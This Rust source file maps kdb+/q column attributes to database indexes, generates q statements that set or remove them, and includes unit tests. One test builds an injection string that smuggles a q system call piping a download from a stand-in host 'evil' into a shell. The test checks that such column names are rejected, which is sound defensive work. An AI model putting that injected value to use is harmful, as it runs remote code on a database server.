//! Attributes (`s#` sorted, `u#` unique, `p#` parted, `g#` grouped) as
//! DBine's indexes. An attribute is a column's, at most one per column:
//! each one is an index of that one column named `g#sym` (the attribute
//! and the column), of kind `g#`, unique for `u#`. `meta` reads them
//! (its `a` column) and `update c:`g#c from `t` sets one in place
//! (`` `#c `` takes it off).
//!
//! An index from the designer or from another engine becomes the attribute
//! its kind names (`s#`, `sorted`…), or `u#` when it's unique and `g#` (a
//! hash index, kdb+'s closest to a secondary index) when not. An index of
//! several columns or with a filter has no attribute to be.

use crate::edit::qsym;
use crate::ipc::K;
use crate::sync::column_name;
use dbine_driver::{Error, IndexDef, Result, TableSchema};

/// The attributes kdb+ has, by their letter.
const LETTERS: &str = "supg";

/// `meta`'s `a` (the attribute of each of `columns`, the empty symbol for
/// none) as indexes.
pub fn indexes(columns: &[String], attrs: Option<&K>) -> Vec<IndexDef> {
    let attrs = attrs.and_then(K::symbols).unwrap_or_default();
    columns
        .iter()
        .zip(attrs)
        .filter_map(|(c, a)| {
            let l = a
                .chars()
                .next()
                .filter(|l| a.len() == 1 && LETTERS.contains(*l))?;
            Some(IndexDef {
                name: format!("{l}#{c}"),
                columns: vec![c.clone()],
                unique: l == 'u',
                kind: Some(format!("{l}#")),
                ..Default::default()
            })
        })
        .collect()
}

/// The attribute `ix` of table `table` is.
pub fn attribute(table: &str, ix: &IndexDef) -> Result<char> {
    let unsupported = |m: String| Error::Unsupported(m);
    if ix.columns.len() != 1 {
        return Err(unsupported(format!(
            "{}.{}: q no tiene índices de varias columnas; un atributo (s#, u#, p#, g#) es de una sola.",
            table, ix.name
        )));
    }
    if ix.filter.as_deref().is_some_and(|f| !f.trim().is_empty()) {
        return Err(unsupported(format!(
            "{}.{}: q no tiene índices filtrados.",
            table, ix.name
        )));
    }
    let kind = ix.kind.as_deref().unwrap_or("").trim();
    let kind = kind.strip_suffix('#').unwrap_or(kind).to_ascii_lowercase();
    let l = match kind.as_str() {
        "" => {
            if ix.unique {
                'u'
            } else {
                'g'
            }
        }
        "s" | "sorted" => 's',
        "u" | "unique" => 'u',
        "p" | "parted" => 'p',
        "g" | "grouped" => 'g',
        _ => {
            return Err(unsupported(format!(
                "{}.{}: «{}» no es un atributo de q (s#, u#, p#, g#).",
                table,
                ix.name,
                ix.kind.as_deref().unwrap_or("")
            )))
        }
    };
    if ix.unique && l != 'u' {
        return Err(unsupported(format!(
            "{}.{}: en q un índice único es u#, y este es {l}#.",
            table, ix.name
        )));
    }
    Ok(l)
}

/// Each column of `t` with the attribute its indexes give it, checked: one
/// of its columns, a name q takes as is, one attribute per column.
pub fn wanted(t: &TableSchema) -> Result<Vec<(String, char)>> {
    let mut out: Vec<(String, char)> = Vec::new();
    for ix in &t.indexes {
        let l = attribute(&t.name, ix)?;
        let c = column_name(&ix.columns[0])?;
        if !t.columns.iter().any(|x| x.name == c) {
            return Err(Error::Unsupported(format!(
                "el índice {} de {} nombra la columna «{}», que la tabla no tiene.",
                ix.name, t.name, c
            )));
        }
        match out.iter().find(|(x, _)| x == c) {
            Some((_, had)) if *had != l => {
                return Err(Error::Unsupported(format!(
                    "{}.{}: q admite un atributo por columna, y tiene {had}# y {l}#.",
                    t.name, c
                )))
            }
            Some(_) => {}
            None => out.push((c.to_string(), l)),
        }
    }
    Ok(out)
}

/// What a table read from kdb+ has (its indexes are its attributes): only
/// those that are attributes, without failing.
fn current(t: &TableSchema) -> Vec<(String, char)> {
    t.indexes
        .iter()
        .filter_map(|ix| Some((ix.columns.first()?.clone(), attribute(&t.name, ix).ok()?)))
        .collect()
}

/// `update c:`g#c from `t`, in place; `None` takes the attribute off.
/// `column` is already checked ([`column_name`]).
pub fn set(table: &str, column: &str, attr: Option<char>) -> String {
    let a = attr.map(String::from).unwrap_or_default();
    format!("update {column}:`{a}#{column} from {}", qsym(table))
}

/// What setting `attr` on a column with rows can fail on.
fn caveat(table: &str, column: &str, attr: char) -> Option<String> {
    Some(match attr {
        'u' => {
            format!("Aplicar u# a {table}.{column} falla si la columna tiene valores repetidos.")
        }
        's' => format!(
            "Aplicar s# a {table}.{column} falla si la columna no está ordenada de menor a mayor."
        ),
        'p' => {
            format!("Aplicar p# a {table}.{column} falla si sus valores iguales no están juntos.")
        }
        _ => return None,
    })
}

/// The attributes of a new table (empty: nothing can fail).
pub fn create(t: &TableSchema) -> Result<Vec<String>> {
    Ok(wanted(t)?
        .into_iter()
        .map(|(c, l)| set(&t.name, &c, Some(l)))
        .collect())
}

/// The statements that take `old`'s attributes to `new`'s on the table
/// `new` names, after its columns changed: `dropped` columns are gone and
/// `recast` ones were cast, which takes their attribute off.
pub fn alter(
    old: &TableSchema,
    new: &TableSchema,
    dropped: &[&str],
    recast: &[&str],
    warnings: &mut Vec<String>,
) -> Result<Vec<String>> {
    let want = wanted(new)?;
    let had = current(old);
    let mut out = Vec::new();
    for c in &new.columns {
        if dropped.contains(&c.name.as_str()) {
            continue;
        }
        let w = want.iter().find(|(x, _)| *x == c.name).map(|(_, l)| *l);
        let h = had
            .iter()
            .find(|(x, _)| *x == c.name)
            .map(|(_, l)| *l)
            .filter(|_| !recast.contains(&c.name.as_str()));
        if w == h {
            continue;
        }
        let name = column_name(&c.name)?;
        out.push(set(&new.name, name, w));
        if let Some(l) = w {
            warnings.extend(caveat(&new.name, name, l));
        }
    }
    Ok(out)
}

/// `t`'s attributes for its DDL (`DdlParts::indexes`).
pub fn ddl(t: &TableSchema) -> Result<String> {
    Ok(create(t)?.join("\n"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ipc::Vector;
    use dbine_driver::ColumnDef;

    fn ix(name: &str, cols: &[&str], unique: bool, kind: Option<&str>) -> IndexDef {
        IndexDef {
            name: name.into(),
            columns: cols.iter().map(|c| c.to_string()).collect(),
            unique,
            kind: kind.map(str::to_string),
            ..Default::default()
        }
    }

    fn table(cols: &[&str], indexes: Vec<IndexDef>) -> TableSchema {
        TableSchema {
            kind: "table".into(),
            name: "trade".into(),
            columns: cols
                .iter()
                .map(|c| ColumnDef {
                    name: c.to_string(),
                    data_type: "long".into(),
                    ..Default::default()
                })
                .collect(),
            indexes,
            ..Default::default()
        }
    }

    #[test]
    fn meta_attributes_are_indexes() {
        let cols: Vec<String> = ["id", "sym", "px", "time", "x"].map(String::from).to_vec();
        let a = K::Vector(
            0,
            Vector::Symbol(["u", "g", "", "s", "p"].map(String::from).to_vec()),
        );
        let got = indexes(&cols, Some(&a));
        let short: Vec<(&str, bool, &str)> = got
            .iter()
            .map(|i| (i.name.as_str(), i.unique, i.kind.as_deref().unwrap()))
            .collect();
        assert_eq!(
            short,
            [
                ("u#id", true, "u#"),
                ("g#sym", false, "g#"),
                ("s#time", false, "s#"),
                ("p#x", false, "p#")
            ]
        );
        assert_eq!(got[1].columns, ["sym"]);
        assert!(indexes(&cols, None).is_empty());
    }

    #[test]
    fn indexes_become_attributes() {
        let a = |unique, kind| attribute("t", &ix("i", &["c"], unique, kind));
        assert_eq!(a(true, None).unwrap(), 'u');
        assert_eq!(a(false, None).unwrap(), 'g');
        assert!(a(false, Some("btree"))
            .unwrap_err()
            .to_string()
            .contains("no es un atributo"));
        for (k, l) in [
            ("s#", 's'),
            ("sorted", 's'),
            ("P", 'p'),
            ("g#", 'g'),
            ("u#", 'u'),
        ] {
            assert_eq!(a(k == "u#", Some(k)).unwrap(), l, "{k}");
        }
        assert!(a(true, Some("g#")).is_err());
        assert!(attribute("t", &ix("i", &["a", "b"], false, None)).is_err());
        let mut f = ix("i", &["c"], false, None);
        f.filter = Some("c>0".into());
        assert!(attribute("t", &f).is_err());
    }

    #[test]
    fn statements_set_and_take_off_attributes() {
        assert_eq!(
            set("trade", "sym", Some('g')),
            "update sym:`g#sym from `trade"
        );
        assert_eq!(
            set("my t", "sym", None),
            "update sym:`#sym from (`$ \"my t\")"
        );
        assert_eq!(set(".ns.t", "a", Some('u')), "update a:`u#a from `.ns.t");
        let t = table(
            &["id", "sym"],
            vec![
                ix("x", &["id"], true, None),
                ix("y", &["sym"], false, Some("g#")),
            ],
        );
        assert_eq!(
            ddl(&t).unwrap(),
            "update id:`u#id from `trade\nupdate sym:`g#sym from `trade"
        );
    }

    #[test]
    fn names_from_another_server_are_checked() {
        let evil = "sym;system\"curl evil|sh\";`sym";
        let t = table(&["sym", evil], vec![ix("x", &[evil], false, None)]);
        assert!(wanted(&t).is_err());
        let t = table(&["sym"], vec![ix("x", &["nope"], false, None)]);
        assert!(wanted(&t).unwrap_err().to_string().contains("no tiene"));
        let t = table(
            &["sym"],
            vec![
                ix("x", &["sym"], false, Some("g")),
                ix("y", &["sym"], false, Some("s")),
            ],
        );
        assert!(wanted(&t)
            .unwrap_err()
            .to_string()
            .contains("un atributo por columna"));
        // The same attribute twice is one.
        let t = table(
            &["sym"],
            vec![
                ix("x", &["sym"], false, None),
                ix("y", &["sym"], false, Some("g#")),
            ],
        );
        assert_eq!(wanted(&t).unwrap(), [("sym".to_string(), 'g')]);
    }

    #[test]
    fn alter_changes_only_what_differs() {
        let old = table(
            &["id", "sym", "px", "gone"],
            vec![
                ix("u#id", &["id"], true, Some("u#")),
                ix("g#sym", &["sym"], false, Some("g#")),
                ix("s#px", &["px"], false, Some("s#")),
                ix("g#gone", &["gone"], false, Some("g#")),
            ],
        );
        let new = table(
            &["id", "sym", "px", "new"],
            vec![
                ix("u#id", &["id"], true, Some("u#")),
                ix("p#sym", &["sym"], false, Some("p#")),
                ix("s#px", &["px"], false, Some("s#")),
                ix("ix_new", &["new"], true, None),
            ],
        );
        let mut w = Vec::new();
        let s = alter(&old, &new, &["gone"], &["px"], &mut w).unwrap();
        assert_eq!(
            s,
            [
                "update sym:`p#sym from `trade",
                // Cast: its attribute goes back on.
                "update px:`s#px from `trade",
                "update new:`u#new from `trade",
            ]
        );
        assert_eq!(w.len(), 3);
        assert!(
            w[0].contains("p#") && w[2].contains("valores repetidos"),
            "{w:?}"
        );
        // Taken off.
        let none = table(&["id", "sym", "px", "gone"], vec![]);
        let s = alter(&old, &none, &[], &[], &mut Vec::new()).unwrap();
        assert_eq!(s.len(), 4);
        assert_eq!(s[1], "update sym:`#sym from `trade");
    }
}
